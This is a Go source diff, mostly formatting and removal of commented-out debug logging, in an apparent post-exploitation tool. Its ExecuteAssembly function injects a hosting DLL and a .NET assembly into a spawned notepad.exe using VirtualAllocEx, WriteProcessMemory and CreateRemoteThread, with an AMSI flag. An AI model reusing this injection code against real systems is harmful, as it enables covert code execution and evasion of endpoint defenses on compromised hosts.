@@ -18,6 +18,7 @@ import (
 )
 
 const (
+
 	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
 	MEM_COMMIT          = 0x001000
 	MEM_RESERVE         = 0x002000
@@ -30,7 +31,7 @@ var (
 	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
 	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
-  procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
+	procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
 )
 
 func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
@@ -79,7 +80,6 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 	return syscall.Handle(r1), threadID, nil
 }
 
-
 func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
 	var exitCode uint32
 	r1, _, e1 := procGetExitCodeThread.Call(
@@ -95,13 +95,9 @@ func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
 // along with a provided .NET assembly to execute.
 func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi bool) error {
 	AssemblySizeArr := convertIntToByteArr(len(assembly))
+
 	ParamsSizeArr := convertIntToByteArr(len(params)+1)// +1 accounts for the trailing null
 
-	//log.Printf("[*] Assembly size        : %d \n", len(assembly))
-	//log.Printf("[*] Assembly arr   (hex) : %x \n", AssemblySizeArr)
-	//log.Printf("[*] Params size          : %d \n", len(params))
-	//log.Printf("[*] Params dll arr (hex) : %x \n", ParamsSizeArr)
-	//log.Printf("[*] Hosting dll size     : %d \n", len(hostingDll))
 
 	cmd := exec.Command("notepad.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{
@@ -143,20 +139,16 @@ func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi boo
 	// parameter bytes
 	// assembly bytes
 	payload := append(AssemblySizeArr, ParamsSizeArr...)
-	if amsi{
+	if amsi {
 		payload = append(payload, byte(1))
-	}else{
+	} else {
 		payload = append(payload, byte(0))
 	}
+
 	payload = append(payload,  []byte(params)...)
 	payload = append(payload,  '\x00')
-	payload = append(payload, assembly...)
 
-	//log.Printf("[*] First nine bytes 			: %x %x %x\n", payload[:4], payload[4:8], payload[8])
-	//log.Printf("[*] Param bytes from payload   	: %x\n", payload[9:9+len(params)])
-	//log.Printf("[*] Param bytes 			   	: %x\n",[]byte(params))
-	//log.Printf("[*] Next 9 bytes of payload		: %x\n",payload[9+len(params):9+len(params)+9])
-	//log.Printf("[*] First 9 bytes of assembly 	: %x\n", assembly[:9])
+	payload = append(payload, assembly...)
 
 	// WriteProcessMemory to write the .NET assembly + args
 	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&payload[0]), uint32(len(payload)))
@@ -191,13 +183,13 @@ func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi boo
 	return nil
 }
 
-func convertIntToByteArr(num int)(arr []byte){
+func convertIntToByteArr(num int) (arr []byte) {
 	// This does the same thing as the union used in the DLL to convert intValue to byte array and back
-	arr = append(arr, byte(num % 256))
+	arr = append(arr, byte(num%256))
 	v := num / 256
-	arr = append(arr, byte(v % 256))
+	arr = append(arr, byte(v%256))
 	v = v / 256
-	arr = append(arr, byte(v % 256))
+	arr = append(arr, byte(v%256))
 	v = v / 256
 	arr = append(arr, byte(v))
 
